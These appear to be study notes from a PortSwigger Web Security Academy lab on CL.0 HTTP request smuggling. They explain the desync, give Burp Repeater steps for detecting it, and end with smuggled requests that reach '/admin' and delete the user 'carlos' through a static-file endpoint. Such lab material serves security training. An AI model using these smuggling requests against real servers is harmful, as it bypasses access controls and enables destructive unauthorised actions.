
# CL.0 Request Smuggling

## Overview


CL.0 Request Smuggling is a type of HTTP Request Smuggling caused by a difference between how the front-end and 

back-end servers determine where an HTTP request ends.


In a vulnerable endpoint:


- The **front-end** respects the `Content-Length` header.

- The **back-end** ignores the `Content-Length` header.

- The back-end considers the request to end immediately after the headers.

- Therefore, the request body can be interpreted as a **new HTTP request**.


---


## How CL.0 Works


Example:


POST /resources/images/blog.svg HTTP/1.1

Host: target

Connection: keep-alive

Content-Length: 36


GET /hopefully404 HTTP/1.1

Foo: x


### Front-end


The front-end respects:


`Content-Length: 36`


Therefore, it considers:


`GET /hopefully404...`


to be part of the POST request body.


### Back-end


The back-end ignores `Content-Length`.


It considers:


`POST /resources/images/blog.svg`


to have ended immediately after the headers.


Therefore, it interprets:



`GET /hopefully404 HTTP/1.1`



as a **new request**.


---


## Finding a Vulnerable Endpoint


1. From **Burp Proxy → HTTP history**, send the `GET /` request to Repeater twice.

2. Add both requests to the same group.

3. Change the first request from `GET` to `POST`.

4. Add an arbitrary smuggling prefix to the body:


GET /hopefully404 HTTP/1.1

Foo: x


5. Set `Content-Length` to the correct body length.

6. Change the path of the main POST request to an endpoint you want to test.

7. Use:


`Send group in sequence (single connection)`


### Interpreting the Response


If the second request receives its normal response:


→ The endpoint is probably **not vulnerable**.


If the second request is affected by the smuggled prefix, for example it receives a `404` response from `/

hopefully404`:


→ The back-end is ignoring `Content-Length`.


This indicates a **CL.0 desynchronization**.


In this lab, static files under `/resources/` can be used to trigger the CL.0 desync.

---


## Exploitation


After identifying a vulnerable endpoint, change the smuggled request to:


GET /admin HTTP/1.1

Foo: x


The back-end then processes:


GET /admin


This allows us to access the admin panel.


Then change the smuggled request to:


GET /admin/delete?username=carlos HTTP/1.1

Foo: x


The back-end processes the request and deletes the user `carlos`.


---


## CL.0 vs 0.CL


### 0.CL


- Front-end → treats the request as having `Content-Length: 0`.

- Back-end → processes the request using `Content-Length`.


### CL.0


- Front-end → respects the normal `Content-Length`.

- Back-end → ignores `Content-Length` and considers the request finished at the end of the headers.

---


## Key Concept


In CL.0:


Front-end:


> "The body is part of the request."


Back-end:


> "The request ended at the headers."


Therefore:


**The request body can become a new HTTP request.**

---


## Lab Payload


POST /resources/images/blog.svg HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Cookie: session=YOUR-SESSION-COOKIE

Connection: keep-alive

Content-Length: CORRECT


GET /admin/delete?username=carlos HTTP/1.1

Foo: x

Source: PortSwigger — CL.0 Request Smuggling